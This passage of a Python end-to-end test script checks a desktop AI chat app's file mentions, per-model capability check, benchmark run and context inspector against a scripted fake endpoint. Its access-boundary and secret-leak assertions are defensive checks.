    Fake.queue.append({"content": "It adds two numbers."})
    Fake.requests.clear()
    s.type(box, "\ue007")
    wait_idle(s)
    assert Fake.requests, "nothing reached the endpoint"
    whole = json.dumps(Fake.requests[0].get("messages", []))
    assert f"File: {calc}, lines 1-2 (function add)" in whole, whole[-1500:]
    assert "def add(a, b):" in whole and "return a + b" in whole, whole[-1500:]
    assert "return a - b" not in whole, "more than the definition was sent"
    # Inside the untrusted-data markers, as an attachment.
    assert 'tool=\\"attachment\\"' in whole, whole[-1500:]
    # Stored with the message: a chip again after a reload.
    user = [m for m in messages(s, chat) if m["role"] == "user"][-1]
    assert [m["label"] for m in user["mentions"]] == ["calc.py#add"], user["mentions"]
    assert user["documents"] == [], user["documents"]
    s.execute("window.location.reload();")
    time.sleep(1.5)
    s.execute(HOOK)
    s.execute(
        """
        const a = [...document.querySelectorAll('nav[aria-label="Chat history"] button')].find(b => b.innerText.includes('What does'));
        a && a.click();
        """
    )
    s.wait_for(lambda: "calc.py#add" in s.page_text(), 15, "the chip on the sent message after a reload")
    # Outside the approved folders: refused by the command, never listed by the search.
    outside = str(c.other / "only-in-other.txt")
    checks = s.invoke("resolve_mentions", {"chatId": chat, "mentions": [{"path": outside}, {"path": "../../other/only-in-other.txt"}]})
    notes.append("refused: " + " | ".join(str(x.get("error")) for x in checks))
    assert all("outside the approved folders" in (x.get("error") or "") for x in checks), checks
    found = s.invoke("search_mentions", {"chatId": chat, "query": "only-in-other", "limit": 20})
    assert found["hits"] == [], found
    sent = s.execute_async(
        """
        const [chatId, path, done] = arguments;
        const cb = window.__TAURI_INTERNALS__.transformCallback(() => {});
        window.__TAURI_INTERNALS__.invoke('send_message', {chatId, text: 'read it', parentId: null,
            mentions: [{path}], onEvent: '__CHANNEL__:' + cb})
          .then(() => done({ok: true}))
          .catch(e => done({ok: false, error: e}));
        """,
        chat,
        outside,
    )
    assert not sent.get("ok") and "outside the approved folders" in json.dumps(sent.get("error")), sent


@probe("capability-check")
def p_capability_check(c, notes):
    """Tested settings per model (0.0.4): "Check this model" in Settings runs three probes
    under two settings against the scripted endpoint, which does the probes right only at
    a low temperature. The results table shows, the best settings are saved as the model's
    profile (not writable through set_setting), a chat turn uses them, the audit log has
    the check's rows, the temporary folders are gone, and Forget removes the profile."""
    import re
    s = c.s
    temp = pathlib.Path(tempfile.gettempdir())

    def runs_left():
        return sorted(p.name for p in temp.glob("harness-run-*")) + sorted(p.name for p in temp.glob("harness-verify-*"))

    before = runs_left()

    def text_of(m):
        content = m.get("content")
        if isinstance(content, list):
            return " ".join(str(p.get("text", "")) for p in content if isinstance(p, dict))
        return str(content or "")

    class Probes:
        """Computes each reply from the request it answers."""

        def __bool__(self):
            return True

        def clear(self):
            pass

        def pop(self, _):
            req = Fake.requests[-1]
            msgs = req.get("messages", [])
            task = next((text_of(m) for m in msgs if m.get("role") == "user"), "")
            results = [text_of(m) for m in msgs if m.get("role") == "tool"]
            cool = abs((req.get("temperature") or 1.0) - 0.2) < 1e-6
            if "note.txt" in task:
                if not results:
                    return {"tool_calls": [{"name": "read_file", "arguments": {"path": "note.txt"}}]}
                word = re.search(r"The code word is (\w+)", results[-1])
                return {"content": word.group(1) if (word and cool) else "pelican"}
            if "settings.txt" in task:
                if not results:
                    new = "color = green" if cool else "color = red"
                    return {"tool_calls": [{"name": "edit_file", "arguments": {"path": "settings.txt", "old_text": "color = blue", "new_text": new}}]}
                return {"content": "Changed."}
            if "limits.txt" in task:
                if not results:
                    return {"tool_calls": [{"name": "edit_file", "arguments": {"path": "limits.txt", "old_text": "limit = 10", "new_text": "limit = 20"}}]}
                if len(results) == 1 and cool:
                    return {"tool_calls": [{"name": "edit_file", "arguments": {"path": "limits.txt", "old_text": "[server]\nlimit = 10", "new_text": "[server]\nlimit = 20"}}]}
                return {"content": "Changed."}
            return {"content": "ok"}

    def view():
        return s.invoke("get_model_profile", {"modelRef": c.model_ref})

    try:
        assert view()["profile"] is None, "a profile exists before any check"
        Fake.queue = Probes()
        Fake.requests.clear()
        s.click_button("Settings")
        s.click_button("Local models")
        time.sleep(0.6)
        s.click_button("Check this model")
        s.wait_for(lambda: "Start the check" in s.page_text(), 10, "the confirmation")
        page = s.page_text()
        assert "temporary folder" in page and "Nothing is asked while it runs" in page, page[-800:]
        # The model is an endpoint: the text names where the tasks go, not "nothing leaves".
        assert "The tasks and the model's replies go to 127.0.0.1." in page, page[-800:]
        assert "Nothing leaves this computer" not in page, page[-800:]
        time.sleep(0.9)
        s.click_button("Start the check")
        s.wait_for(lambda: "(chosen)" in s.page_text(), 180, "the results table")
        time.sleep(0.8)
        s.screenshot(str(OUT / "capability-check.png"))
        table = s.execute("const t = document.querySelector('table[aria-label=\"Check results\"]'); return t ? t.innerText : null;")
        notes.append("table: " + str(table).replace("\n", " | "))
        assert table and "Temperature 0.2 (chosen)" in table, table
        assert "passed" in table and "failed" in table and "native" in table, table
        # Six probe runs (two settings, three probes), all through the scripted endpoint.
        temps = sorted({r.get("temperature") for r in Fake.requests}, key=str)
        assert temps == [0.2, None] or temps == [None, 0.2], temps
        saved = view()
        profile = saved["profile"]
        assert profile and profile["chosen"] == "Temperature 0.2", saved
        assert profile["defaults"] == {"temperature": 0.2}, profile["defaults"]
        key = saved["key"]
        assert key.startswith("modelProfile:"), key
        assert s.invoke("get_setting", {"key": key})["chosen"] == "Temperature 0.2"
        try:
            s.invoke("set_setting", {"key": key, "value": {"chosen": "x"}})
            raise AssertionError("set_setting wrote a model profile")
        except WebDriverError as e:
            assert "cannot be changed this way" in str(e), e
        # The check's own audit row, decided by the user, and its calls under it; no chat.
        rows = s.invoke("list_audit", {"filter": {"limit": 200}})
        run_rows = [r for r in rows if r["server"] == "evals" and r["tool"] == "capability_check"]
        assert len(run_rows) == 1, run_rows
        run_id = run_rows[0]["id"]
        calls = [r for r in rows if r.get("parent_audit_id", r.get("parentAuditId")) == run_id]
        assert len(calls) >= 6, len(calls)
        assert all(r.get("chat_id", r.get("chatId")) is None for r in calls + run_rows)
        assert all(r["preview"].startswith("Model check: ") for r in calls), calls[0]["preview"]
        notes.append(f"audit: 1 run row, {len(calls)} call rows")
        # The temporary folders are gone.
        assert set(runs_left()) <= set(before), (before, runs_left())
        # A chat with this model now asks for the tested temperature.
        Fake.queue = []
        s.execute("document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));")
        time.sleep(0.4)
        chat = new_chat(c)
        Fake.requests.clear()
        Fake.queue.append({"content": "Hello."})
        send(s, "hello")
        wait_idle(s)
        assert Fake.requests and Fake.requests[-1].get("temperature") == 0.2, Fake.requests[-1].get("temperature")
        # Forget: the table goes, and the next turn uses the model's own settings again.
        s.click_button("Settings")
        s.click_button("Local models")
        s.wait_for(lambda: "Forget these settings" in s.page_text(), 10, "the saved results")
        time.sleep(0.8)
        s.screenshot(str(OUT / "capability-check-saved.png"))
        s.click_button("Forget these settings")
        s.wait_for(lambda: "(chosen)" not in s.page_text(), 10, "the table is gone")
        assert view()["profile"] is None
        s.execute("document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));")
        time.sleep(0.4)
        Fake.requests.clear()
        Fake.queue.append({"content": "Hello again."})
        send(s, "again")
        wait_idle(s)
        assert "temperature" not in Fake.requests[-1], Fake.requests[-1].get("temperature")
        assert messages(s, chat)[-1]["text"] == "Hello again."
        # A benchmark from Settings, Diagnostics: the scripted model does none of the work,
        # so no task passes; the run is saved on this computer and shown as a table.
        tasks = s.invoke("list_bench_tasks", {})
        assert len(tasks) >= 10, tasks
        s.click_button("Settings")
        s.click_button("Diagnostics")
        time.sleep(0.6)
        s.click_button("Run the benchmark")
        s.wait_for(lambda: "Start the benchmark" in s.page_text(), 10, "the benchmark confirmation")
        page = s.page_text()
        assert "with your rights" in page and "Run the benchmark only with a model you trust." in page, page[-800:]
        time.sleep(0.9)
        s.click_button("Start the benchmark")
        s.wait_for(lambda: s.execute("return document.querySelector('table[aria-label=\"Benchmark results\"]') !== null;"), 300, "the benchmark table")
        bench = s.execute("return document.querySelector('table[aria-label=\"Benchmark results\"]').innerText;")
        notes.append("bench total: " + bench.strip().splitlines()[-1])
        assert f"0 of " in bench and "completed" in bench, bench
        runs = s.invoke("list_bench_runs", {})
        assert len(runs) == 1 and runs[0]["totals"]["completed"] == 0, runs
        run = s.invoke("get_bench_run", {"id": runs[0]["id"]})
        assert len(run["tasks"]) == len(tasks)
        assert all(t["status"] in ("failed", "skipped") for t in run["tasks"]), [t["status"] for t in run["tasks"]]
        saved = list((c.db.parent / "benchmarks").glob("*.json"))
        assert len(saved) == 1, saved
        assert set(runs_left()) <= set(before), (before, runs_left())
        bench_rows = [r for r in s.invoke("list_audit", {"filter": {"limit": 500}}) if r["server"] == "evals" and r["tool"] == "benchmark"]
        assert len(bench_rows) == 1 and bench_rows[0]["result_status"] == "ok", bench_rows
    finally:
        Fake.queue = []
        try:
            s.invoke("cancel_eval", {})
        except Exception:  # noqa: BLE001
            pass


@probe("context-inspector")
def p_context_inspector(c, notes):
    """The context inspector (0.0.4): with a pin, a task, a mention and tools on, the Context
    tab lists what the next request contains; Copy all has the system prompt and the pin;
    looking changes nothing; the request then sent is what the tab showed; a user message
    is pinned with its Pin action, and only the user's own message can be."""
    s = c.s
    aside = 'aside[aria-label="Workbench"]'
    pin_text = "Answer in German."
    tools = [t for t in ["read_file", "list_dir", "update_task"] if t in c.all_tools]
    chat = new_chat(c, tools=tools)
    s.invoke("rename_chat", {"chatId": chat, "title": "Inspector"})
    s.invoke("add_pin", {"chatId": chat, "text": pin_text, "everyChat": False})
    notes_file = c.work / "inspector-notes.txt"
    notes_file.write_text("the meeting is on Tuesday\n")

    # A first turn with a mention: the model records a task.
    Fake.queue.append({"tool_calls": [{"name": "update_task", "arguments": {
        "goal": "Plan the meeting", "steps": [{"text": "Read the notes", "status": "done"}],
        "next_action": "Write the agenda"}}]})
    Fake.queue.append({"content": "The task is recorded."})
    sent = s.execute_async(
        """
        const [chatId, path, done] = arguments;
        const cb = window.__TAURI_INTERNALS__.transformCallback(() => {});
        window.__TAURI_INTERNALS__.invoke('send_message', {chatId, text: 'Plan the meeting from my notes', parentId: null,
            mentions: [{path}], onEvent: '__CHANNEL__:' + cb})
          .then(() => done({ok: true}))
          .catch(e => done({ok: false, error: e}));
        """, chat, str(notes_file))
    assert sent.get("ok"), sent
    # The user changes the next action, so the next turn carries the task note.
    s.invoke("edit_task", {"chatId": chat, "edit": {"nextAction": "Write the agenda for Tuesday"}})

    s.execute("window.location.reload();")
    time.sleep(1.5)
    s.wait_for(lambda: "Inspector" in s.page_text(), 20, "sidebar after reload")
    s.execute(HOOK)
    s.execute("[...document.querySelectorAll('nav[aria-label=\"Chat history\"] button')].find(b => b.innerText.includes('Inspector')).click();")
    time.sleep(0.8)
    s.click_button("Panel")
    s.wait_for(lambda: s.execute(f"return !!document.querySelector('{aside}');"), 10, "the panel")
    s.execute(f"[...document.querySelectorAll('{aside} [role=tab]')].find(b => b.innerText.includes('Context')).click();")
    s.wait_for(lambda: s.execute(f"return document.querySelectorAll('{aside} [data-section]').length;") == 11, 15, "the sections")

    def detail(section):
        return s.execute(f"const e = document.querySelector('{aside} [data-section=\"{section}\"] [data-section-detail]'); return e ? e.innerText : null;")

    titles = s.execute(f"return [...document.querySelectorAll('{aside} [data-section] button .font-medium')].map(e => e.innerText);")
    assert titles == ["System prompt", "Pinned instructions", "Tool instructions", "Skills list", "Loaded skills",
                      "Tool definitions", "Summary of earlier messages", "Messages kept", "Messages left out",
                      "Task note", "Attachments"], titles
    assert detail("pinned") == "1 pin", detail("pinned")
    tools_line = detail("tools")
    notes.append("tools: " + tools_line)
    assert "read_file" in tools_line, tools_line
    task_line = detail("task")
    notes.append("task: " + task_line)
    assert task_line and task_line != "None", task_line
    assert "inspector-notes.txt" in detail("attachments"), detail("attachments")
    totals = s.execute(f"const e = document.querySelector('{aside} [data-inspector-totals]'); return e ? e.innerText : null;")
    assert totals and "of 32,768 tokens" in totals, totals
    # The pin's text, when its row is opened.
    s.execute(f"document.querySelector('{aside} [data-section=\"pinned\"] button').click();")
    time.sleep(0.3)
    assert pin_text in s.execute(f"return document.querySelector('{aside} [data-section=\"pinned\"]').innerText;")
    s.screenshot(str(OUT / "context-inspector.png"))

    # Copy all: what goes to the clipboard has the system prompt and the pin (pasted into
    # the message box to read it, then cleared).
    s.execute(f"[...document.querySelectorAll('{aside} button')].find(b => b.innerText.trim() === 'Copy all').click();")
    s.wait_for(lambda: s.execute(f"return [...document.querySelectorAll('{aside} button')].some(b => b.innerText.trim() === 'Copied');"), 10, "the copy done")
    box = s.find("textarea")
    s.type(box, "\ue009v\ue009")
    s.wait_for(lambda: len(s.execute("return document.querySelector('textarea').value;") or "") > 50, 10, "the pasted text")
    copied = s.execute("return document.querySelector('textarea').value;")
    s.execute("""
        const el = document.querySelector('textarea');
        Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set.call(el, '');
        el.dispatchEvent(new Event('input', {bubbles: true}));
    """)
    view = s.invoke("inspect_context", {"chatId": chat})
    system_prompt = next(x for x in view["sections"] if x["id"] == "system")["text"]
    assert system_prompt and system_prompt in copied, (system_prompt, copied[:300])
    assert pin_text in copied, copied[:600]
    # No key and no address in what the tab gets.
    for secret in ("sk-test", "127.0.0.1"):
        assert secret not in json.dumps(view) and secret not in copied, secret

    # Looking changes nothing: the database and the chat's remembered tools stay as they were.
    def snapshot():
        con = sqlite3.connect(c.db)
        try:
            rows = {}
            for table, where in [("tasks", "chat_id = ?"), ("chats", "id = ?"), ("tool_outputs", "chat_id = ?"),
                                 ("audit_log", "chat_id = ?"), ("pinned_instructions", "chat_id = ?"),
                                 ("messages", "chat_id = ?")]:
                try:
                    rows[table] = con.execute(f"SELECT * FROM {table} WHERE {where} ORDER BY rowid", (chat,)).fetchall()
                except sqlite3.OperationalError as e:
                    rows[table] = str(e)
            rows["audit_all"] = con.execute("SELECT count(*) FROM audit_log").fetchone()
            return rows
        finally:
            con.close()
    before = snapshot()
    first = s.invoke("inspect_context", {"chatId": chat})
    second = s.invoke("inspect_context", {"chatId": chat})
    assert snapshot() == before, "looking at the context changed the database"
    assert first == second == view, "two looks gave different answers"

    # The request the next turn sends is what the tab showed just before.
    Fake.requests.clear()
    Fake.queue.append({"content": "Here is the agenda."})
    send(s, "and now the agenda please")
    wait_idle(s)
    assert Fake.requests, "nothing was sent"
    req = Fake.requests[0]
    blocks = [x["text"] for x in view["sections"] if x["id"] in ("system", "pinned", "preamble", "skills", "loadedSkills", "summary") and x["text"]]
    assert req["messages"][0]["content"] == "\n\n".join(blocks), (req["messages"][0]["content"][:400], blocks)
    shown_tools = [json.loads(chunk) for chunk in next(x for x in view["sections"] if x["id"] == "tools")["text"].split("\n\n") if chunk]
    assert [t["function"]["name"] for t in req.get("tools", [])] == [t["function"]["name"] for t in shown_tools], tools_line
    assert req.get("tools", []) == shown_tools, "the tool definitions differ"
    task_note = next(x for x in view["sections"] if x["id"] == "task")["text"]
    last_user = [m for m in req["messages"] if m["role"] == "user"][-1]
    last_text = last_user["content"] if isinstance(last_user["content"], str) else json.dumps(last_user["content"])
    assert task_note and task_note.splitlines()[0] in last_text, (task_note[:200], last_text[-400:])
    kept = next(x for x in view["sections"] if x["id"] == "kept")["text"]
    for m in req["messages"][1:-1]:
        content = m.get("content")
        text = content if isinstance(content, str) else "\n".join(p.get("text", "") for p in (content or []) if isinstance(p, dict))
        assert text in kept, ("a sent message was not shown", text[:200])

    # The Pin action on the user's own message: it appears in the list through the event.
    first_user = [m for m in messages(s, chat) if m["role"] == "user"][0]
    s.execute("document.querySelector(arguments[0]).click();", f'button[data-pin-message="{first_user["id"]}"]')
    s.wait_for(lambda: "Plan the meeting from my notes" in s.execute(f"return document.querySelector('{aside}').innerText;"), 10, "the pinned message listed")
    pins = [p["text"] for p in s.invoke("list_pins", {"chatId": chat})["pins"]]
    assert pins == [pin_text, "Plan the meeting from my notes"], pins
    # Only the user's own message: the model's is refused.
    answer = [m for m in messages(s, chat) if m["role"] == "assistant"][-1]
    try:
        s.invoke("pin_message", {"chatId": chat, "messageId": answer["id"]})
        raise AssertionError("the model's message was pinned")
    except WebDriverError as e:
        assert "Only a message you wrote in this chat can be pinned." in str(e), e
    s.click_button("Panel")


PROBES = [p_markdown, p_settings, p_general, p_remote_ctx, p_folders, p_skills, p_skill_guard, p_terminal_git, p_errors, p_stop, p_mcp,
          p_regen_error, p_switch, p_delete, p_reasoning, p_text_call, p_subagent, p_step_limit, p_allow_all, p_full_access,
          p_tool_selection, p_artifacts, p_search, p_pinned,
          p_tool_errors_output, p_task_state, p_mentions, p_capability_check, p_context_inspector]


def main() -> int:
    home = OUT / "home"
    shutil.rmtree(home, ignore_errors=True)
    home.mkdir(parents=True)
    c = Ctx()
    c.work = OUT / "work"
    c.other = OUT / "other"
    for d in (c.work, c.other):
        shutil.rmtree(d, ignore_errors=True)
        d.mkdir()
    (c.work / "notes.txt").write_text("the secret word is heron\n")
    (c.other / "only-in-other.txt").write_text("x\n")
    env = dict(os.environ)
    env.update(HOME=str(home), XDG_DATA_HOME=str(home / "data"), XDG_CONFIG_HOME=str(home / "config"),
               XDG_CACHE_HOME=str(home / "cache"), APP_DEV_LLAMA_DIR=LLAMA_DIR, RUST_LOG="info")
    fake_port = free_port()
    fake = ThreadingHTTPServer(("127.0.0.1", fake_port), Fake)
    threading.Thread(target=fake.serve_forever, daemon=True).start()
    port = free_port()
    driver = subprocess.Popen(
        ["tauri-driver", "--port", str(port), "--native-driver", shutil.which("WebKitWebDriver") or "WebKitWebDriver"],
        env=env, stdout=open(OUT / "tauri-driver.log", "w"), stderr=subprocess.STDOUT)
    s = None
    try:
        time.sleep(1.5)
        s = Session(f"http://127.0.0.1:{port}", {"tauri:options": {"application": APP}})
        c.s = s
        s.wait_text("Welcome to", 60)
        s.execute(HOOK)
        s.click_button("Skip for now")
        s.wait_text("New chat", 20)
        c.db = home / "data" / IDENTIFIER / "app.db"
        c.skills_root = home / "data" / IDENTIFIER / "skills"
        con = sqlite3.connect(c.db)
        con.execute("INSERT INTO approved_folders(path, chat_id, created_at) VALUES (?, NULL, ?)", (str(c.work), int(time.time() * 1000)))
        con.commit()
        con.close()
        p = s.invoke("save_provider", {"provider": {"id": None, "name": "Fake", "kind": "generic",
                                                     "baseUrl": f"http://127.0.0.1:{fake_port}/v1", "apiKey": "sk-test", "clearApiKey": False}})
        models = s.invoke("test_provider", {"id": p["id"]})
        c.model_ref = models[0]["ref"]
        first = s.invoke("create_chat", {"modelRef": c.model_ref})
        c.default_tools = [t["exposed"] for t in s.invoke("list_chat_tools", {"chatId": first["id"]}) if t["enabledInChat"]]
        c.all_tools = [t["exposed"] for t in s.invoke("list_chat_tools", {"chatId": first["id"]})]
        print("default tools:", c.default_tools, flush=True)
        # Unknown context on a remote endpoint: the default must be 4,096.
        s.invoke("set_chat_tools", {"chatId": first["id"], "enabled": c.all_tools})
        s.invoke("set_setting", {"key": "remoteContextLength", "value": 32768})
        for fn in PROBES:
            run(fn, c)
    finally:
        if s:
            try:
                s.screenshot(str(OUT / "final.png"))
            except Exception:  # noqa: BLE001
                pass
            s.quit()
        driver.terminate()
        fake.shutdown()
    print("\n===== SUMMARY")
    for name, status, notes, console in RESULTS:
        print(f"{status}  {name}  ({len(console)} console lines)")
    failed = [name for name, status, _, _ in RESULTS if status != "PASS"]
    if failed or not RESULTS:
        print("SCRIPTED AGENT FAIL:", ", ".join(failed) or "nothing ran")
        return 1
    print("SCRIPTED AGENT PASS")
    print(f"artifacts in {OUT}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
